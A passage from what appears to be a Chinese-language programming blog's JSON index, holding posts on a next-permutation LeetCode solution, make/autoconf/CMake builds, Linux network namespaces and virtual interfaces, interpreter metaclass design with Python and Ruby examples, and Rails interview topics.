1:\nInput: nums = [1,2,3]Output: [1,3,2]Example 2:\nInput: nums = [3,2,1]Output: [1,2,3]Example 3:\nInput: nums = [1,1,5]Output: [1,5,1]Example 4:\nInput: nums = [1]Output: [1] Constraints:\n1 \u003c= nums.length \u003c= 1000 \u003c= nums[i] \u003c= 100 原理 1 2 3 最後要變成 3 2 1 觀察3 2 1的大小，都是 前一個大於等於下一個 (字典序最大)\n那麼如果再加一個數字像0 3 2 1就會破壞這個規則， 所以要重新往 前一個大於等於下一個 這個條件靠近。\n因為我們要的是下一個字典序的排列(與現在排列差異最小)， 所以下一個排列的第一個要從現有的部分挑一個最小的來換，讓第一位差異最小， 我們可以從中挑一個大於那個數字的最小數來交換\n延續上面例子會變成1 3 2 0\n接著是原本的範圍如何讓他的字典序最小? reverse!!\n所以下一個排序是1 0 2 3\ndef findStartOfRevOrder(arr): i = len(arr)-1 # start from the last index while i \u0026gt; 0 and arr[i-1] \u0026gt;= arr[i]: i -= 1 return i if i \u0026gt; 0 else -1 def reverse_in_place(alist,left,right): #condition for termination while left\u0026lt;right: #swapping temp = alist[left] alist[left] = alist[right] alist[right] = temp #updating pointers left += 1 right -= 1 class Solution: def nextPermutation(self, arr: List[int]) -\u0026gt; None: \u0026#34;\u0026#34;\u0026#34; Do not return anything, modify nums in-place instead. \u0026#34;\u0026#34;\u0026#34; i = findStartOfRevOrder(arr)-1 j = len(arr)-1 if i \u0026gt;= 0: while j \u0026gt;= 0 and arr[i] \u0026gt;= arr[j]: # keep the small ones in last j -= 1 if j \u0026gt;= 0: # swap arr[i], arr[j] = [arr[j],arr[i]] #arr[i+1:] = arr[i+1:][::-1] # keep big digit as the last reverse_in_place(arr,i+1,len(arr)-1) else: reverse_in_place(arr,0,len(arr)-1) 556 把數字當成排列\ndef findStartOfRevOrder(arr): i = len(arr)-1 # start from the last index while i \u0026gt; 0 and arr[i-1] \u0026gt;= arr[i]: i -= 1 return i if i \u0026gt; 0 else -1 def f(arr): i = findStartOfRevOrder(arr)-1 if i \u0026gt;= 0: j = len(arr)-1 while j \u0026gt;= 0 and arr[i] \u0026gt;= arr[j]: # keep the small ones in last j -= 1 if j \u0026gt;= 0: # swap arr[i], arr[j] = [arr[j],arr[i]] arr[i+1:] = arr[i+1:][::-1] # keep big digit as the last i = findStartOfRevOrder(arr)-1 return arr else: return False class Solution: def nextGreaterElement(self, n: int) -\u0026gt; int: arr = [int(c) for c in str(n)] ret = f(arr) if ret: ret = [str(n) for n in ret] ret = int(\u0026#39;\u0026#39;.join(ret)) if ret \u0026gt;= 2147483647: ret = -1 else: ret = -1 return ret ","permalink":"https://littlebees.github.io/2020/11/leetcode-31-next-permutation/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這是經典演算法，基本上沒有寫過就要在面試時寫出來，應該十分困難\u003c/p\u003e","title":"leetcode-31 - Next Permutation"},{"content":"動機 最近被autoconf弄，所以來記錄一下各種make 如果需要範例code在github上\n手工 header是給compiler看，但不管實際上有沒有這些函數的實作\n之後是透過linker去static或是dynamic的地方找code\n這次的範例是有三個cpp(與各自的header)\n一個主程式 : main.cpp static 的 函數 : stc.cpp dynamic 的 函數 : dyn.cpp 編的方式 給I:去哪找header 給L:去哪找so 給l:用哪個library(像libdyn.so就是-ldyn)\ng++ -c -o syn.o syn.cpp g++ -fPIC -shared -o libdyn.so dyn.cpp g++ -I. -o main main.cpp sta.o libdyn.so LD_LIBRARY_PATH=. ./main # LD_LIBRARY_PATH is to indicate where to search .so file make makefile的邏輯很簡單\n每個target都有對應要編的檔案 再編檔案之前都要看前提有沒有滿足 而Makefile為了方便有一些自訂的變數，像\n$@: target的名字 $^: 整串前提 $\u0026lt;: 所有前提的第一項 那PHONY是為了什麼存在的? clean沒有對應的檔案，但可以當成一個假的target去跑\nmain: main.cpp sta.o dyn.so g++ -I. -o $@ $^ dyn.so: dyn.cpp g++ -fPIC -shared -o $@ $^ %.o: %.cpp g++ -c -o $@ $\u0026lt; # current , first clean: rm *.o *.so .PHONY: clean autoconf 整個步驟如下\nautoscan mv configure.scan configure.in 改 configure.in 寫 Makefile.am autoreconf -i ./configure make 很長，也很眼花撩亂\n先看configure.in，主要是看有EDIT或是ADD的那幾行\n# -*- Autoconf -*- # Process this file with autoconf to produce a configure script. AC_PREREQ([2.69]) #AC_INIT([FULL-PACKAGE-NAME], [VERSION], [BUG-REPORT-ADDRESS]) AC_INIT(main, 1.0.0, 123456@gmail.com) # EDIT AC_CONFIG_SRCDIR([main.cpp]) AM_INIT_AUTOMAKE([foreign -Wall -Werror]) # EDIT, optional AC_CONFIG_HEADERS([config.h]) # autoreconf complain ,so add this line AC_CONFIG_MACRO_DIRS([m4]) # ADD this to stop complaining # Checks for programs. AC_PROG_CXX AC_PROG_CC # Checks for libraries. LT_INIT # ADD this, cuz we have .so file # Checks for header files. # Checks for typedefs, structures, and compiler characteristics. # Checks for library functions. AC_CONFIG_FILES([Makefile]) AC_OUTPUT 再來是Makefile.am，同樣看註解\nAUTOMAKE_OPTIONS=foreign # autoreconf complain, so add this line ACLOCAL_AMFLAGS = -I m4 # program !! bin_PROGRAMS=main main_SOURCES=main.cpp sta.cpp include_HEADERS = sta.h dyn.h # Add out .so file lib_LTLIBRARIES = libdyn.la libdyn_la_SOURCES = dyn.cpp # link .so file after compiling has done LDADD = libdyn.la cmake 人性化的多，只要一個CMakeLists.txt，就沒事了\n比較需要注意的是CMAKE_SOURCE_DIR與CMAKE_BINARY_DIR\nAssuming that you have 2 folders src and build where src contains your projects and build is the empty folder that you just created so you can deploy your out-of-tree build in it: CMAKE_SOURCE_DIR is the path to src where CMAKE_BINARY_DIR points to build.\nCMAKE_CURRENT_SOURCE_DIR =\u0026gt; CMakeLists.txt在? CMAKE_CURRENT_BINARY_DIR =\u0026gt; cmake正在哪裡跑?\n感覺這根本不用解釋，看就懂了\ncmake_minimum_required (VERSION 3.16) project(main CXX) include_directories( ${CMAKE_SOURCE_DIR} ) link_directories( ${CMAKE_SOURCE_DIR} ) set(main_SOURCES main.cpp sta.cpp ) add_library(dyn SHARED dyn.cpp ) set(main_LIBS dyn ) add_executable( ${PROJECT_NAME} ${main_SOURCES} ) target_link_libraries( ${PROJECT_NAME} ${main_LIBS} ) Ref CMake 入門 cmake与autoconf+automake的对比 构建Make,Automake,CMake Using Automake and Autoconf xmake vs cmake对比分析 Where is CMAKE_SOURCE_DIR?\n","permalink":"https://littlebees.github.io/2020/10/%E5%90%84%E7%A8%AEmake/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e最近被autoconf弄，所以來記錄一下各種make\n如果需要範例code在\u003ca href=\"https://github.com/littlebees/xxmake-demo\"\u003egithub上\u003c/a\u003e\u003c/p\u003e","title":"各種make"},{"content":"動機 雖然說是netns筆記，但其實主要是說linux的虛擬網路裝置\u0026hellip;\nTUN/TAP TUN/TAP 可以想成一個網卡但與某個fd直連 所以有 TUN/TAP 有兩個 input與output 的來源\n網路 fd =\u0026gt; OS中跑的程式 TUN可以看到IP層，TAP可以看到第二層\n這個與一般用socket來read不同的是，我們不用聽到tcp或udp的port 雖然聽起來很像廢話，但都是write/read，我們能一般都是用tcp或udp，但TUN/TAP讓我們有能力看到第三、二層的封包。\nTUN/TAP整體更像一個userspace與kernelspace溝通的手段，中間透過network stack這樣\nveth-pair \u0026amp; bridge 可以想成有兩張網卡(TUN)直接用線接起來，主要搭配bridge(brctl)使用，這樣就可以模擬把線插在一般的switch\n下面是用veth-pair連結兩個netns\n# add the namespaces ip netns add ns1 ip netns add ns2 # create the veth pair ip link add tap1 type veth peer name tap2 # move the interfaces to the namespaces ip link set tap1 netns ns1 ip link set tap2 netns ns2 # bring up the links ip netns exec ns1 ip link set dev tap1 up ip netns exec ns2 ip link set dev tap2 up # add ip ip netns exec ns1 ip a add 192.168.123.1/24 dev tap1 ip netns exec ns2 ip a add 192.168.123.2/24 dev tap2 把veth換成實體的網卡，就可以跑local breakout了，而方法也差不多，不過不用加網卡(ip link add)，把link set的dev name換成要加的網卡就好\nmacvlan 可以想成 veth-pair \u0026amp; bridge 的打包一次到好的版本\n同樣都是可以在L2把大家連在一起\n有不同的模式\nbridge mode: 功能與veth-pair \u0026amp; bridge一樣，透過bridge(software)來route VEPA mode: 與bridge mode不同的點是 透過外面的switch(hardware) 來route private mode: 誰都不能通信 Passthru mode: veth-pair 要注意的是macvlan不能用在802.11，還有macvlan每多一個網卡就會吃掉一個MAC\nipvlan 與macvlan很像，但可以運作在第三層\n那兩者的差別在\nipvlan可以共用實體port的MAC，macvlan每多一個網卡就會吃掉一個MAC\nipvlan有L2與L3 mode 兩者差別是\nL2的broadcast在L3 mode不會被處理，L2會\nmacvtap/ipvtap 就是macvlan/ipvlan的網卡，可以有TAP/TUN的功能，可以用fd寫與收資料了\nbridge L2的switch\n可以用brctl改相關設定，像stp之類的\n下面是用bridge配合veth pair把兩個netns連起來\n# add the namespaces ip netns add ns1 ip netns add ns2 # create the switch BRIDGE=br-test brctl addbr $BRIDGE brctl stp $BRIDGE off ip link set dev $BRIDGE up # #### PORT 1 # create a port pair ip link add tap1 type veth peer name br-tap1 # attach one side to linuxbridge brctl addif br-test br-tap1 # attach the other side to namespace ip link set tap1 netns ns1 # set the ports to up ip netns exec ns1 ip link set dev tap1 up ip link set dev br-tap1 up # #### PORT 2 # create a port pair ip link add tap2 type veth peer name br-tap2 # attach one side to linuxbridge brctl addif br-test br-tap2 # attach the other side to namespace ip link set tap2 netns ns2 # set the ports to up ip netns exec ns2 ip link set dev tap2 up ip link set dev br-tap2 up # add ip ip netns exec ns1 ip a add 192.168.123.1/24 dev tap1 ip netns exec ns2 ip a add 192.168.123.2/24 dev tap2 Ref 利用 Linux tap/tun 虚拟设备写一个 ICMP echo 程序 Macvlan 和 IPvlan Linux网络虚拟化相关的虚拟网卡-VETH/MACVLAN/MACVTAP/IPVLAN(转载) linux 网络虚拟化： ipvlan Introduction to Linux interfaces for virtual networking network namespace连接的4种方法及性能\n","permalink":"https://littlebees.github.io/2020/10/netns%E8%88%87%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E8%A3%9D%E7%BD%AE/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e雖然說是netns筆記，但其實主要是說linux的虛擬網路裝置\u0026hellip;\u003c/p\u003e","title":"netns與虛擬網路裝置"},{"content":"動機 之前欠的要補\u0026hellip;\n希望你知道\u0026hellip; interpreter的結構 scheme(或lisp) class的演化 lambda的部分是interpreter的一部份code\n其實這裡的重點是struct(這裡叫record)有什麼，只要了解為什麼struct這樣設計大概就會了解到底發生什麼事\nclass \u0026amp; instance 把東西分成class與class之下的instance\ninstance有\n其所屬的class attribute的值 class有\nclass var的symbol(名字) class var的值 attribute的symbol(名字) method的表(method_name =\u0026gt; real_proc) (define-record instance (class i-vals)) (define-record class (c-vars c-vals i-vars m-env)) (lambda (exp env class inst) (variant-case exp (i-varref (var) (lookup var (class-\u0026gt;i-vars (something-\u0026gt;value class)) (instance-\u0026gt;i-vals (something-\u0026gt;value inst)))) (c-varref (var) (lookup var (class-\u0026gt;c-vars (something-\u0026gt;value class)) (class-\u0026gt;c-vals (something-\u0026gt;value class)))) (i-varassign (var exp) (let ((value (eval-exp exp env class inst))) (void-\u0026gt;expressed (assign! var value (class-\u0026gt;i-vars (something-\u0026gt;value class)) (instance-\u0026gt;i-vals (something-\u0026gt;value inst)))))) (c-varassign (var exp) (let ((value (eval-exp exp env class inst)) (c-vals (class-\u0026gt;c-vals (something-\u0026gt;value class)))) (void-\u0026gt;expressed (assign! var value (class-\u0026gt;c-vars (something-\u0026gt;value class)) c-vals)))) (method (formals body) (let ((new-formals (cons \u0026#39;self formals))) (open-method-\u0026gt;expressed (lambda (class-thunk) ;; class has not instanced, wait for the class here (lambda (args) (eval-exp body (extend-env new-formals (map expressed-\u0026gt;denoted args) env) (make-something (class-thunk)) (make-something (car args)))))))) (meth-app (name rands) (let ((args (map (lambda (rand) (eval-exp rand env class inst)) rands))) (meth-call name (instance-\u0026gt;class (car args)) args))) (new-simpleinst (class-exp) (let ((inst-class (eval-exp class-exp env class inst))) (let ((new-inst (make-instance inst-class (make-vals (class-\u0026gt;i-vars inst-class))))) (ignore (meth-call \u0026#39;initialize inst-class (list new-inst))) new-inst))) (new-simpleclass (c-vars i-vars methdecls init-exp) (let ((open-methods (map (lambda (decl) (expressed-\u0026gt;open-method (eval-exp (decl-\u0026gt;exp decl) env class inst))) methdecls))) (letrec ((new-class (make-class c-vars (make-vals c-vars) i-vars (extend-method-env (map decl-\u0026gt;var methdecls) (map (lambda (open-meth) (open-meth (lambda () new-class))) open-methods) init-meth-env)))) (ignore (eval-exp init-exp env (make-something new-class) (make-nothing))) new-class))))) inherence 現在class可以往上找，所以多一個parent指到另一個class\n(define-record instance (class i-vals)) (define-record class (parent c-vars c-vals i-vars m-env)) (lambda (exp env class inst) (variant-case exp (new-class (parent-exp c-vars i-vars methdecls init-exp) (let ((parent-class (eval-exp parent-exp env class inst)) (open-methods (map (lambda (decl) (expressed-\u0026gt;open-method (eval-exp (decl-\u0026gt;exp decl) env class inst))) methdecls))) (let ((new-c-vars (append c-vars (class-\u0026gt;c-vars parent-class))) (new-i-vars (append i-vars (class-\u0026gt;i-vars parent-class))) (new-c-vals ; NEW! (make-shared-c-vals (class-\u0026gt;c-vals parent-class) c-vars))) (letrec ((new-class (make-class (make-something parent-class) new-c-vars new-c-vals new-i-vars (extend-method-env (map decl-\u0026gt;var methdecls) (map (lambda (open-method) (open-method (lambda () new-class))) open-methods) (class-\u0026gt;m-env parent-class))))) (ignore (eval-exp init-exp env (make-something new-class) (make-nothing))) new-class)))) (super-meth-app (name rands) (let ((args (map (lambda (x) (eval-exp x env class inst)) rands))) (meth-call name (something-\u0026gt;value (class-\u0026gt;parent (something-\u0026gt;value class))) (cons (something-\u0026gt;value inst) args)))) ;; Figure 7.1.3 : page 219 (i-varref (var) (lookup var (class-\u0026gt;i-vars (something-\u0026gt;value class)) (instance-\u0026gt;i-vals (something-\u0026gt;value inst)))) (c-varref (var) (lookup var (class-\u0026gt;c-vars (something-\u0026gt;value class)) (class-\u0026gt;c-vals (something-\u0026gt;value class)))) (i-varassign (var exp) (let ((value (eval-exp exp env class inst))) (void-\u0026gt;expressed (assign! var value (class-\u0026gt;i-vars (something-\u0026gt;value class)) (instance-\u0026gt;i-vals (something-\u0026gt;value inst)))))) (c-varassign (var exp) (let ((value (eval-exp exp env class inst)) (c-vals (class-\u0026gt;c-vals (something-\u0026gt;value class)))) (void-\u0026gt;expressed (assign! var value (class-\u0026gt;c-vars (something-\u0026gt;value class)) c-vals)))) (method (formals body) (let ((new-formals (cons \u0026#39;self formals))) (open-method-\u0026gt;expressed (lambda (class-thunk) (lambda (args) (eval-exp body (extend-env new-formals (map expressed-\u0026gt;denoted args) env) (make-something (class-thunk)) (make-something (car args)))))))) (meth-app (name rands) (let ((args (map (lambda (rand) (eval-exp rand env class inst)) rands))) (meth-call name (instance-\u0026gt;class (car args)) args))) (new-simpleinst (class-exp) (let ((inst-class (eval-exp class-exp env class inst))) (let ((new-inst (make-instance inst-class (make-vals (class-\u0026gt;i-vars inst-class))))) (ignore (meth-call \u0026#39;initialize inst-class (list new-inst))) new-inst))) ;; The following is a convenience to make old examples work (stackclass). ;; Syntax-expand can\u0026#39;t handle simpleclass, because then it would be ;; expanded away in section 7.1 (new-simpleclass (c-vars i-vars methdecls init-exp) (eval-exp (make-new-class (make-varref \u0026#39;baseobject) c-vars i-vars methdecls init-exp) env class inst)))) metaclass 從繼承那邊可以看出來，其實parent與class(struct中的ptr)很像，都是往被指到的東西中找值，所以其實我們也不用區分是class還是instance\n把class與instance和在一起，會發現，我們不需要c-vals與c-vars，因為\n如果要instance變數，就看i-vals 如果要class變數，就看class的i-vals 到這裡就可以知道，為什麼python與ruby的class都可以有自己的變數，同時可以在某種程度上當class變數用\n(define-record instance (class parent i-vars m-env i-vals)) (lambda (exp env class inst) (variant-case exp (c-varref (var) (lookup var (class-\u0026gt;i-vars (something-\u0026gt;value (instance-\u0026gt;class (something-\u0026gt;value class)))) (instance-\u0026gt;i-vals (something-\u0026gt;value class)))) (c-varassign (var exp) (let ((value (eval-exp exp env class inst))) (void-\u0026gt;expressed (assign! var value (class-\u0026gt;i-vars (something-\u0026gt;value (instance-\u0026gt;class (something-\u0026gt;value class)))) (instance-\u0026gt;i-vals (something-\u0026gt;value class)))))) (new-instance (class-exp parent-exp i-vars methdecls) (let ((inst-class (eval-exp class-exp env class inst)) (parent-class (eval-exp parent-exp env class inst)) (open-methods (map (lambda (decl) (expressed-\u0026gt;open-method (eval-exp (decl-\u0026gt;exp decl) env class inst))) methdecls))) (let ((new-i-vars (append i-vars (class-\u0026gt;i-vars parent-class)))) (letrec ((new-inst (make-instance (make-something inst-class) (make-something parent-class) new-i-vars (extend-method-env (map decl-\u0026gt;var methdecls) (map (lambda (open-method) (open-method (lambda () new-inst))) open-methods) (class-\u0026gt;m-env parent-class)) (make-vals (class-\u0026gt;i-vars inst-class))))) (ignore (meth-call \u0026#39;initialize inst-class (list new-inst))) new-inst)))) ;; Figure 7.2.4 : page 228 (super-meth-app (name rands) (let ((args (map (lambda (x) (eval-exp x env class inst)) rands))) (meth-call name (something-\u0026gt;value (class-\u0026gt;parent (something-\u0026gt;value class))) (cons (something-\u0026gt;value inst) args)))) ;; Figure 7.1.3 : page 219 (i-varref (var) (lookup var (class-\u0026gt;i-vars (something-\u0026gt;value class)) (instance-\u0026gt;i-vals (something-\u0026gt;value inst)))) (i-varassign (var exp) (let ((value (eval-exp exp env class inst))) (void-\u0026gt;expressed (assign! var value (class-\u0026gt;i-vars (something-\u0026gt;value class)) (instance-\u0026gt;i-vals (something-\u0026gt;value inst)))))) (method (formals body) (let ((new-formals (cons \u0026#39;self formals))) (open-method-\u0026gt;expressed (lambda (class-thunk) (lambda (args) (eval-exp body (extend-env new-formals (map expressed-\u0026gt;denoted args) env) (make-something (class-thunk)) (make-something (car args)))))))) (meth-app (name rands) (let ((args (map (lambda (rand) (eval-exp rand env class inst)) rands))) (meth-call name (something-\u0026gt;value (instance-\u0026gt;class (car args))) args))))) python 從剛剛metaclass的struct來看，先不管i-vals與i-vars與m-env\n看到下面的code的class C 可以發現 B 是 parent，而A是 class\n再看到type.__new__(ins, name,parent,attrs) attrs就是Dict，可以放值或是function，可以當成i-vals與i-vars與m-env的結合\n所以ins是 class， parent是parent，這裡生的就是instance\n剛剛是把python的metaclass與之前說的metaclass做結合， 剩下的部分就是__new__與__init__，__new__就是會丟出instance，而__init__就是instance的終點 另外super就是找繼承鍊上的instance，詳情可以看Ref的文章\nclass A(type): def __new__(ins, name, parent, attrs): print(\u0026#34;in A\u0026#34;) attrs[\u0026#39;ins_var_of_C\u0026#39;] = 101 ins.class_var_of_C = \u0026#39;123\u0026#39; ret = type.__new__(ins, name,parent,attrs) return ret def from_A(self): return 1000 class B(object): def __new__(ins): print(\u0026#34;in B\u0026#34;) ins.b = 19 return super().__new__(ins) class C(B,metaclass=A): def __new__(ins): print(\u0026#34;in C\u0026#34;) ins.from_here = 876 return super().__new__(ins) def __init__(self): self.a = 999 C.from_A() c = C() print(c.b) print(c.a) print(c.from_here) print(C.ins_var_of_C) print(C.class_var_of_C) print(c.ins_var_of_C) ruby 與python不同的是，class的部分(metaclass in Python)，沒有指定的機會，Ruby會自己生\n但是Ruby有eval來做許多壞事\ninstance_eval 就是用 之前提到的instance來做eval，可以想像成用instance的所有資料作為跑code的環境 class_eval 其實就是會檢查 執行的obj是不是class，其實用{class}.instance_eval是等於{class}.class_eval的\nclass Object # The hidden singleton lurks behind everyone def metaclass; class \u0026lt;\u0026lt; self; self; end; end def meta_eval \u0026amp;blk; metaclass.instance_eval \u0026amp;blk; end # Adds methods to a metaclass def meta_def name, \u0026amp;blk meta_eval { define_method name, \u0026amp;blk } end # Defines an instance method within a class def class_def name, \u0026amp;blk class_eval { define_method name, \u0026amp;blk } end end class MailTruck def self.company( name ) meta_def :company do; name; end # 吃當下的class的metaclass來加method，也就是替被執行該method的class加一個class method，叫company end end class HappyTruck \u0026lt; MailTruck company \u0026#34;Happy\u0026#39;s -- We Bring the Mail, and That\u0026#39;s It!\u0026#34; end class Creature def self.traits( *arr ) return @traits if arr.empty? attr_accessor *arr arr.each do |trait| meta_def trait do |val| @traits ||= {} @traits[trait] = val end end class_def :initialize do self.class.traits.each do |k,v| instance_variable_set( \u0026#34;@#{k}\u0026#34;, v ) end end class_def :hi do self.class.traits.each do |k,_| puts \u0026#34;#{self.instance_eval \u0026#34;self.#{k}\u0026#34;}\u0026#34; end end end end class A \u0026lt; Creature traits :a, :b, :c end A.a 10 A.b 20 A.c 30 x = A.new y = A.new puts \u0026#34;x content\u0026#34; x.hi puts \u0026#34;y content\u0026#34; y.hi puts \u0026#34;change\u0026#34; y.b = 100 y.hi Ref EoPL1 Ch10 Metaprogramming in Ruby 你不知道的 super\n","permalink":"https://littlebees.github.io/2020/10/metaclass-class%E8%88%87instance%E7%9A%84%E8%9E%8D%E5%90%88/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e之前欠的要補\u0026hellip;\u003c/p\u003e","title":"metaclass - class與instance的融合"},{"content":"動機 也許有需要，也複習一下rails\n||= foo, bar = [], 1 foo ||= bar # foo = foo || bar foo 這邊弔詭的是false value，也就是什麼value會被視為false hash default value default value不會自己被copy喔\n還有後面看到的值寫不進去hash，應該牽涉到ruby處理method call的方式\na = hsh[:something] a.send(:=, val) hsh = Hash.new([]) hsh[:one] \u0026lt;\u0026lt; \u0026#39;one\u0026#39; hsh[:two] \u0026lt;\u0026lt; \u0026#39;two\u0026#39; hsh[:nonexistent] # =\u0026gt; [\u0026#39;one\u0026#39;, \u0026#39;two\u0026#39;] hsh # =\u0026gt; {} hsh = Hash.new([]) hsh[:one] += [\u0026#39;one\u0026#39;] hsh[:two] += [\u0026#39;two\u0026#39;] # This is syntactic sugar for hsh[:two] = hsh[:two] + [\u0026#39;two\u0026#39;] hsh[:nonexistant] # =\u0026gt; [] hsh # =\u0026gt; { :one =\u0026gt; [\u0026#39;one\u0026#39;], :two =\u0026gt; [\u0026#39;two\u0026#39;] } hsh = Hash.new { [] } # This time, instead of a default *value*, we use a default *block* hsh[:one] \u0026lt;\u0026lt; \u0026#39;one\u0026#39; hsh[:two] \u0026lt;\u0026lt; \u0026#39;two\u0026#39; hsh[:nonexistent] # =\u0026gt; [] # We *did* mutate the default value, but it was a fresh one every time. hsh # =\u0026gt; {} # But we never mutated the hash itself, therefore it is still empty! hsh = Hash.new {|hsh, key| hsh[key] = [] } hsh[:one] \u0026lt;\u0026lt; \u0026#39;one\u0026#39; hsh[:two] \u0026lt;\u0026lt; \u0026#39;two\u0026#39; hsh[:nonexistent] # =\u0026gt; [] # We *did* mutate the default value, but it was a fresh one every time. hsh # =\u0026gt; { :one =\u0026gt; [\u0026#39;one\u0026#39;], :two =\u0026gt; [\u0026#39;two\u0026#39;], :nonexistent =\u0026gt; [] } proc \u0026amp; lambda \u0026amp; block block沒有apply的一串代碼 lambda正常的lambda proc有點像macro(可以當成裡面的code複製貼上)，但有自己的scope\ndef whowouldwin mylambda = lambda {return \u0026#34;Freddy\u0026#34;} mylambda.call # mylambda gets called and returns \u0026#34;Freddy\u0026#34;, and execution # continues on the next line return \u0026#34;Jason\u0026#34; end whowouldwin #=\u0026gt; \u0026#34;Jason\u0026#34; # Proc returns control not just from the proc, but also from the method enclosing the proc! def whowouldwin2 myproc = Proc.new {return \u0026#34;Freddy\u0026#34;} myproc.call # myproc gets called and returns \u0026#34;Freddy\u0026#34;, # but also returns control from whowhouldwin2! # The line below *never* gets executed. return \u0026#34;Jason\u0026#34; end whowouldwin2 #=\u0026gt; \u0026#34;Freddy\u0026#34; equal == : 值 eql? : 值 \u0026amp; type equal? : 記憶體位置 === : lhs.includes?(rhs) p Fixnum === 1 # =\u0026gt; true p 1 === Fixnum # =\u0026gt; false p 100 == 100.0 # =\u0026gt; true p 100.eql? 100.0 # =\u0026gt; false tap 就是把instance丟到block中跑再丟回原本的instance\n# x 就是物件，caller，或是receiver (1..5).tap { |x| puts \u0026#34;element: #{x.inspect}\u0026#34; }.to_a # =\u0026gt; element: 1..5 .tap { |x| puts \u0026#34;array: #{x.inspect}\u0026#34; } # =\u0026gt; array: [1, 2, 3, 4, 5] .select { |x| x%2 == 0 } .tap{ |x| puts \u0026#34;evens: #{x.inspect}\u0026#34; } # =\u0026gt; evens: [2, 4] .map{ |x| x*x } .tap{ |x| puts \u0026#34;squares: #{x.inspect}\u0026#34; } # =\u0026gt; squares: [4, 16] Present and exist present: 看是不是false value\n[ \u0026#34;\u0026#34;, \u0026#34; \u0026#34;, false, nil, [], {} ].any?(\u0026amp;:present?) # =\u0026gt; false 用在orm上會悲劇\nUser.where(name: \u0026#39;mike\u0026#39;).present? # User Load (8.1ms) SELECT \u0026#34;users\u0026#34;.* FROM \u0026#34;users\u0026#34; WHERE \u0026#34;users\u0026#34;.\u0026#34;name\u0026#34; = $1 ORDER BY users.id ASC [[\u0026#34;name\u0026#34;, \u0026#39;mike\u0026#39;]] exist: 基本上是用在orm上，看有沒有row存在\nUser.exists?(name: \u0026#39;mike\u0026#39;) # User Exists (2.4ms) SELECT 1 AS one FROM \u0026#34;users\u0026#34; WHERE \u0026#34;users\u0026#34;.\u0026#34;name\u0026#34; = $1 ORDER BY users.id ASC LIMIT 1 [[\u0026#34;name\u0026#34;, \u0026#39;mike\u0026#39;]] # 如果是any? 1 AS one的部分會變成COUNT(*) freeze freeze可以當成c++的const\n所以會有\nint* - pointer to int int const * - pointer to const int int * const - const pointer to int 就是在Pointer上的const或是在pointer內容的const\nN+1 query class User \u0026lt; ActiveRecord::Base has_many :clients end class Client \u0026lt; ActiveRecord::Base has_many :contacts belongs_to :user end class Contact \u0026lt; ActiveRecord::Base belongs_to :client end @contacts = @user.clients.includes( :contact ) class Post \u0026lt; ActiveRecord::Base has_many :comments belongs_to :user end class Comment \u0026lt; ActiveRecord::Base has_many :replies belongs_to :user end class Reply \u0026lt; ActiveRecord::Base belongs_to :user end class User \u0026lt; ActiveRecord::Base has_many :posts has_many :comments has_many :replies end # 不包含user Post.includes(:comments =\u0026gt; [:replies]) # 包含user Post.includes(:user, :comments= \u0026gt; [:user, {:replies =\u0026gt; [:user]}]) 如果是在別的table的東西就可以先用includes來preload\ntest data: fixture \u0026amp; factory bot Rails內建有Fixture功能可以建立假資料，方法是為每個Model使用一份YAML資料。 Fixture的缺點是它是直接插入資料進資料庫而不使用ActiveRecord，對於複雜的Model資料建構或關連，會比較麻煩。\nFactoryGirl這套工具，相較於Fixture的缺點是建構速度較慢。\norder = FactoryBot.create( :order, line_items: [FactoryBot.create(:line_item, price_cents: 40000)], payments: [FactoryBot.create(:payment, amount_cents: 40000)] ) # orders.yml payments_equal_line_item_total: # no attributes needed # line_items.yml electric_dog_polisher: order: payments_equal_line_item_total name: \u0026#39;Electric dog polisher\u0026#39; price_cents: 40000 # payment_methods.yml visa: name: \u0026#39;Visa\u0026#39; # payments.yml first: order: payments_equal_line_item_total payment_method: visa amount_cents: 40000 # order = orders(:payments_equal_line_item_total) RESTful \u0026amp; CURD 這裡可以看成對array操作 像\narr # events_path, GET arr[i] # event_path(@event), GET arr \u0026lt;\u0026lt; \u0026#34;something\u0026#34; # events_path, POST arr.delete(i) # event_path(@event), DELETE arr.update(i, \u0026#34;something\u0026#34;) # event_path(@event), PATCH/PUT 那為什麼需要\nedit_event_path(@event) new_event_path event_path(@event) 的GET\n因為我們透過網頁與user互動，把input轉成資料再調用診真正的action\nhelper GET POST PATCH/PUT DELETE event_path(@event) /events/1 : show action /events/1 : update action /events/1 : destroy action events_path /events : index action /events : create action edit_event_path(@event) /events/1/edit : edit action new_event_path /events/new : new action how to handle req \u0026amp; header orm callback Ref 菜鳥Rails工作面試初體驗 Jr. Ruby on Rails Engineer面試初體驗（上） See also: 我的中高階 Rails 工作面試心得分享 面試 interview Ruby 重要概念整理 Ruby hash default value behavior Ruby面試精選30題 - Day29 Ruby的tap method Ruby面試精選30題 - Day23 Ruby的\u0026rsquo;==\u0026rsquo;，\u0026rsquo;===\u0026rsquo; \u0026rsquo;eql?\u0026rsquo; \u0026rsquo;equal?\u0026rsquo; When to use lambda, when to use Proc.new? Web, Rails, 用巢狀include和查表方式來避免 n+1 query A Visual Guide to Using :includes in Rails Ruby on Rails 實戰聖經 Factories and fixtures in Rails See also: Fast Ruby\n","permalink":"https://littlebees.github.io/2020/10/rails%E5%B8%B8%E8%A6%8B%E9%9D%A2%E8%A9%A6%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e也許有需要，也複習一下rails\u003c/p\u003e","title":"rails常見面試問題整理"},{"content":"動機 寫寫ruby奇妙的繼承\n但原本寫好的metaclass的文居然失蹤了!!!\n我找不到\u0026hellip;.\n之後會補\u0026hellip;.\n因為原本寫metaclass的文章不見了，所以只好臨時補一個來說明metaclass 其實大家都是instance 結構大概像\nstruct instance { // a.k.a. metaclass instance* _meta; // only storing sigleton methods instance* _class; instance* _parent_class; vector\u0026lt;Val\u0026gt; _i_vals; vector\u0026lt;Symbol\u0026gt; _i_vars; Map\u0026lt;Symbol, Method\u0026gt; _m_env; }; 所以 instance method是 _class 的 _m_env class method是 _class 的 _meta 的 _m_env singleton method是 _meta 的 _m_env\n這裡的metaclass是一種資料結構 在python的metaclass是這裡的_class(是什麼class) 